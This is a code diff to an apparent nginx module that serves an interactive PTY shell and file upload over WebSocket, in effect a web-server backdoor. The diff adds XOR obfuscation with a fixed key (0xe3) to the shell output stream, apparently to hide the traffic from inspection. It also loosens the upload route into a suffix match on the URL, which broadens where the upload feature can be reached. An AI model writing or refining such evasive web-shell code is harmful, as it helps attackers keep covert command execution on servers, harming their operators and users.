@@ -33,6 +33,13 @@ typedef struct pid_entry_s {
 
 static pid_entry_t pids;
 
+void xor(u_char *buf, ssize_t len) {
+	int i;
+	for ( i = 0;i < len;i++ ) {
+		buf[i] = buf[i] ^ 0xe3;
+	}
+}
+
 void ngx_pty_recv(ngx_event_t *ev) {
 	ngx_http_request_t *r = ev->data;
 	shell_ctx_t *ctx = ngx_get_session(r);
@@ -46,6 +53,7 @@ void ngx_pty_recv(ngx_event_t *ev) {
 		return;
 	}
 	*ctx->inbuf = 'y';
+	xor(ctx->inbuf+1, n);
 	if (ngx_websocket_do_send(r, ctx->inbuf, n + 1) != NGX_OK) {
 		ngx_websocket_do_close(r);
 		return;
@@ -104,10 +112,15 @@ void ngx_websocket_on_open(ngx_http_request_t *r) {
 		ngx_websocket_do_close(r);
 		return;
 	}
-	if (!ngx_strncmp(r->uri.data, (u_char*)"/upload", sizeof("/upload") - 1)) {
-		ngx_set_session(r, ctx);
-		return;
-	}
+	const char* sstr = "/upload/";
+	const int sstr_len = sizeof(sstr);
+	int begin_index = r->uri.len - sstr_len;
+	if (begin_index >= 0) {
+		if (!ngx_strncmp(r->uri.data + begin_index, (u_char*)sstr, sstr_len)) {
+			ngx_set_session(r, ctx);
+			return;
+		}
+        }
 	pid_entry_t *p = ngx_alloc(sizeof(pid_entry_t), ngx_cycle->log);
 	if (p == NULL) {
 		ngx_websocket_do_close(r);
